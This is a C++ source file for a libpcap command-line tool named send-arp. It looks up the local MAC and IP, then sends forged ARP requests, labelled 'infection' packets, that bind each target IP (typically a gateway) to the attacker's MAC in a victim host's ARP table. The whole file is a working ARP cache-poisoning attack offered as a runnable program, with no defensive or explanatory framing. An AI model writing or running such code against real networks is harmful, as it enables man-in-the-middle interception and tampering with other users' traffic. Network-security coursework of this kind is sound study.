#include <cstdio>
#include <cstring>
#include <pcap.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void getMyMacAddress(Mac& mac, const char* interface) {
	struct ifreq ifr;
	int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
	if (sock < 0) {
		perror("socket");
		exit(1);
	}
	strncpy(ifr.ifr_name, interface, IFNAMSIZ);
	if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
		perror("ioctl");
		close(sock);
		exit(1);
	}
	memcpy(&mac, ifr.ifr_hwaddr.sa_data, Mac::SIZE);
	close(sock);
}

Ip getMyIpAddress(const char* interface) {
	struct ifreq ifr;
	int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
	if (sock < 0) {
		perror("socket");
		exit(1);
	}
	strncpy(ifr.ifr_name, interface, IFNAMSIZ);
	if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
		perror("ioctl");
		close(sock);
		exit(1);
	}
	close(sock);
	return ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr;
}

int sendArpInfectionPacket(pcap_t* handle, Mac my_mac, Ip sender_ip, Ip target_ip) {
	EthArpPacket arp_infection_packet;

	arp_infection_packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	arp_infection_packet.eth_.smac_ = my_mac;
	arp_infection_packet.eth_.type_ = htons(EthHdr::Arp);

	arp_infection_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	arp_infection_packet.arp_.pro_ = htons(EthHdr::Ip4);
	arp_infection_packet.arp_.hln_ = Mac::SIZE;
	arp_infection_packet.arp_.pln_ = Ip::SIZE;
	arp_infection_packet.arp_.op_ = htons(ArpHdr::Request);
	arp_infection_packet.arp_.smac_ = my_mac;
	arp_infection_packet.arp_.sip_ = htonl(target_ip);
	arp_infection_packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	arp_infection_packet.arp_.tip_ = htonl(sender_ip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arp_infection_packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return -1;
	}
	return 0;
}

void send_arp_packet(pcap_t* handle, Mac my_mac, Ip sender_ip, Ip target_ip) {
    bool success = false;
    for (int j = 0; j < 40 && !success; ++j) {
        if (sendArpInfectionPacket(handle, my_mac, sender_ip, target_ip) == 0) {
            success = true;
        }
    }

    if (success) {
        printf("ARP table change success!\n");
        printf("Changed MAC address: %s\n", std::string(my_mac).c_str());
    } else {
        printf("Failed to change ARP table.\n");
    }
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf);
		return -1;
	}

	Mac my_mac;
	getMyMacAddress(my_mac, dev);
	Ip my_ip = getMyIpAddress(dev);

	for (int i = 2; i < argc; i += 2) {
		Ip sender_ip(argv[i]);
		Ip target_ip(argv[i + 1]);

		send_arp_packet(handle, my_mac, sender_ip, target_ip);
	}

	pcap_close(handle);
	return 0;
}
